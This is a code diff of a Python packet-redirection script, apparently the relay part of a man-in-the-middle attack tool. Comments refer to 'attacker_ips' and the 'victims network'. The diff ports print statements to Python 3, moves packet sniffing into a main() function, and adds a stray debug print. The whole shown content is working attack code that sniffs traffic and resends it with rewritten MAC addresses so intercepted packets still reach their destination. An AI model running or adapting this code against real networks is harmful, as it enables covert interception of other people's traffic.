@@ -31,21 +31,26 @@ def handle_packet(packet):
     if IP in packet:
         # Try to lookup the actual mac address of the package
         if packet[IP].dst not in ip_to_mac:
-            print 'received a packet for an unknown host (%s)' % packet[IP].dst
+            print('received a packet for an unknown host (%s)' % packet[IP].dst)
         else:
             target_dst = ip_to_mac[packet[IP].dst]
 
             # Ignore packets target towards ourself or already correctly targeted packets, since either we generated
             # them or they are legitimate packets originating from our own host.
             if packet[IP].dst not in attacker_ips and target_dst != packet.dst:
-                print 'redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst)
+                print('redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst))
                 packet.dst = target_dst
                 sendp(packet)
 
 
-sniff(
-    iface=network_interface,
-    store=0,
-    # filter="tcp and port 80", # @todo move this filtering to a later point in time, filtering here would break the victims network
-    prn=handle_packet
-)
+def main():
+    print("sssssss")
+    sniff(
+        iface=network_interface,
+        store=0,
+        # filter="tcp and port 80", # @todo move this filtering to a later point in time, filtering here would break the victims network
+        prn=handle_packet
+    )
+
+if __name__ == '__main__':
+    main()
